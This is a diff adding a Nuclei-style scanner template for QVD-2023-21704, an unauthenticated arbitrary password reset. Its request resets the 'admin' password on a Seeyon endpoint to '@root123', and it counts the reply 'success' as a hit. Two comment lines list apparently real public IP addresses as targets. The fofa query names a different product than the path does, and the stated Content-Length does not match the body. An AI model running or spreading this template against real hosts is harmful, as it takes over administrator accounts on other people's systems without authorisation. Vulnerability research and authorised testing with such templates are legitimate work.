@@ -1,0 +1,32 @@
+id: password_reset
+info:
+  name: 前台任意用户密码重置
+  author: mike
+  severity: info
+  description: QVD-2023-21704
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="用友-U8-Cloud"
+http:
+  - raw:
+      - |
+        POST /seeyon/rest/phoneLogin/phoneCode/resetPassword HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Content-Length: 45
+        Connection: close
+
+        {"loginName":"admin","password":"@root123"} 
+        
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "success"
+
+# http://202.109.226.102:9000/seeyon/rest/phoneLogin/phoneCode/resetPassword
+# http://218.87.159.110:9090/seeyon/rest/phoneLogin/phoneCode/resetPassword
